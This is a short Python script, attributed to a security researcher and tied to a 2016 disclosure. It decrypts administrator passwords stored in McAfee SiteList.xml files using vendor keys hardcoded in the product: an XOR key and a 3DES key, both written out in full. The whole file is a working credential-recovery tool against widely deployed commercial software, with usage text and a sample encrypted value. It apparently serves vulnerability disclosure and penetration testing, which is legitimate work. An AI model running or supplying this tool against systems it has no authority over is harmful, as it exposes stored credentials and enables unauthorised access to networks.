#!/usr/bin/env python
# Info: 
#    McAfee Sitelist.xml password decryption tool
#    Jerome Nokin (@funoverip) - Feb 2016
#    More info on https://funoverip.net/2016/02/mcafee-sitelist-xml-password-decryption/
#
# Quick howto: 
#    Search for the XML element <Password Encrypted="1">...</Password>,
#    and paste the content as argument.
#
###########################################################################

import sys
import base64
from Crypto.Cipher import DES3
from Crypto.Hash import SHA

def sitelist_xor(xs):
    # hardcoded XOR key 
    key = "12150F10111C1A060A1F1B1817160519".decode("hex")
    j = 0
    output=''
    for i in range(0,len(xs)):
        output += chr(ord(xs[i]) ^ ord(key[j]))
        j+=1
        if j%16 == 0:
            j=0
    return output

def des3_ecb_decrypt(data):
    # hardcoded 3DES key
    key = SHA.new(b'<!@#$%^>').digest() + "\x00\x00\x00\x00"
    # decrypt
    des3 = DES3.new(key, DES3.MODE_ECB, "\x00\x00\x00\x00\x00\x00\x00\x00")
    decrypted = des3.decrypt(data)
    # quick hack to ignore padding
    decrypted = decrypted[0:decrypted.find('\x00')]
    if len(decrypted) == 0:
        decrypted = "<empty>"
    return decrypted


if __name__ == "__main__":

    if len(sys.argv) != 2:
        print "Usage:   %s <base64 passwd>" % sys.argv[0]
        print "Example: %s 'jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q=='" % sys.argv[0]
        sys.exit(0)

    # read arg
    encrypted_password = base64.b64decode(sys.argv[1]) 
    # decrypt
    password = des3_ecb_decrypt(sitelist_xor(encrypted_password))
    # print out
    print "Crypted password   : %s" % sys.argv[1]
    print "Decrypted password : %s" % password

    sys.exit(0)
